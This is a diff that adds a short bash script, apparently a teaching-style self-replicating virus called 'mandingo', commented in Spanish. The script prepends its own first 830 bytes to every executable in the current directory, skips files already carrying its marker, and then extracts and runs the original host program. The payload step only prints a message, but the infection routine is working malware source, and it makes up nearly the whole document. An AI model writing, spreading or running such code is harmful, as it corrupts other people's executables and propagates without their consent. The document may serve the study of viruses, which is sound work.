@@ -1,0 +1,47 @@
+#mandingo
+#!/bin/bash
+#1. Localizar ejecutables
+TAM=830
+
+for FICHERO in *
+do
+	if test -x $FICHERO
+	then
+		#Esquivar programas infectados
+		
+		if test $( head -n 1 $FICHERO ) = "#mandingo"
+		then
+			echo "Skip: $fich"
+			continue
+		fi
+
+		#2. Infectar ejecutables
+		echo "Infectado: $FICHERO"
+		tmpvirus=$( tempfile )
+		dd if=$0 of=$tmpvirus bs=1 count=$TAM
+		#2>/dev/null
+		echo "dd wiki"
+		tmpinfectado=$( tempfile )
+		cat $tmpvirus $FICHERO > $tmpinfectado
+		mv $tmpinfectado $FICHERO
+		chmod +x $FICHERO #mejor dar los mismos permisos
+	else
+		echo "No ejecutable: $FICHERO"
+	fi
+	
+done
+
+#3. Ejecutar payload
+echo "Ejecutando payload"
+#4. Ejecutar huesped
+tmporiginal=$( tempfile )
+nuevo="/tmp/"$0
+dd if=$0 of=$tmporiginal ibs=1 skip=$TAM
+rm $nuevo
+ln -s $tmporiginal $nuevo
+#2>dev/null
+chmod +x $tmporiginal 
+$nuevo
+exit 0
+
+#Fin
